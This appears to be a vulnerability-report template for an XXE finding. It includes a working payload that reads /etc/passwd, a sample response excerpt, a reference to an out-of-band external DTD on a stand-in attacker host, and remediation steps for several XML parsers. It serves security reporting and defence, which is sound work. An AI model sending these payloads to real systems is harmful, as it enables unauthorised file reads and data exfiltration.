# XXE Finding — Report Template

```markdown
## XXE: <feature> allows arbitrary local file read / OOB exfiltration

**Severity**: High/Critical (CVSS 8.2-9.1)
**Asset**: https://target.example.com/api/import-xml
**Type**: CWE-611 Improper Restriction of XML External Entity Reference

### Vulnerable request

```xml
POST /api/import-xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

### Response excerpt

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/bin/false
... (3 more lines shown as proof)
```

Screenshot: evidence/xxe_passwd.png.

### OOB confirmation

External DTD hosted at attacker.tld/evil.dtd triggered callbacks from
203.0.113.x at <timestamp>; evidence/oob_http.png.

### Impact

- Arbitrary file read as the API service user (uid 33 www-data).
- Configuration files reachable: /etc/hostname proven; secrets paths were
  NOT accessed beyond proof-of-read scope.

### Remediation

1. Disable external entities entirely:
   - libxml2: XML_PARSE_NOENT off; use XML_PARSE_HUGE carefully
   - Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true)
     + disallow-doctype-decl true
   - .NET: XmlReaderSettings.DtdProcessing = Prohibit
2. Reject DOCTYPE declarations at gateway level for untrusted inputs.
3. Switch import formats to JSON where feasible.
```
